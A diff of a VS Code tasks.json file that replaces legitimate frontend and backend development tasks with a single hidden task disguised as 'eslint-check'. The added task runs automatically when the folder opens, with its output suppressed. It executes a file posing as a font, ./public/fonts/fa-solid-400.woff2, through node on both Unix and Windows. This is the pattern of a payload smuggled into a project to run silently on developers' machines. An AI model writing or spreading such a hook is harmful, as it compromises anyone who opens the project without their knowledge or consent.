@@ -1,88 +1,33 @@
 {
-    "version": "2.0.0",
-    "tasks": [
-        {
-            "label": "Start App",
-            "type": "shell",
-            "command": "${workspaceFolder}/app/start.sh",
-            "windows": {
-                "command": "pwsh ${workspaceFolder}/app/start.ps1"
-            },
-            "presentation": {
-                "reveal": "silent"
-            },
-            "options": {
-                "cwd": "${workspaceFolder}/app"
-            },
-            "problemMatcher": []
-        },
-        {
-            "label": "Development",
-            "dependsOn": [
-                "Frontend: npm run dev",
-                "Backend: quart run"
-            ],
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            }
-        },
-        {
-            "label": "Frontend: npm run dev",
-            "type": "npm",
-            "script": "dev",
-            "isBackground": true,
-            "options": {
-                "cwd": "${workspaceFolder}/app/frontend"
-            },
-            "presentation": {
-                "reveal": "always",
-                "group": "buildWatchers",
-                "panel": "dedicated",
-                "clear": false
-            },
-            "problemMatcher": {
-                "pattern": {
-                    "regexp": ""
-                },
-                "background": {
-                    "activeOnStart": true,
-                    "beginsPattern": ".*VITE v.*",
-                    "endsPattern": ".*(?:➜\\s*)?Local:\\s+https?://.*"
-                }
-            }
-        },
-        {
-            "label": "Backend: quart run",
-            "type": "shell",
-            "command": "${workspaceFolder}/.venv/bin/python",
-            "windows": {
-                "command": "${workspaceFolder}\\.venv\\Scripts\\python.exe"
-            },
-            "args": ["-m", "quart", "run", "--reload", "-p", "50505"],
-            "options": {
-                "cwd": "${workspaceFolder}/app/backend",
-                "env": {
-                    "QUART_APP": "main:app",
-                    "QUART_ENV": "development",
-                    "QUART_DEBUG": "0",
-                    "LOADING_MODE_FOR_AZD_ENV_VARS": "override"
-                }
-            },
-            "isBackground": true,
-            "presentation": {
-                "reveal": "always",
-                "group": "buildWatchers",
-                "panel": "dedicated"
-            },
-            "problemMatcher": {
-                "pattern": { "regexp": "" },
-                "background": {
-                    "activeOnStart": true,
-                    "beginsPattern": ".*Serving Quart app.*",
-                    "endsPattern": ".*hypercorn.*Running on http://.*"
-                }
-            }
-        }
-    ]
+  "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''", 
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+  ]
 }
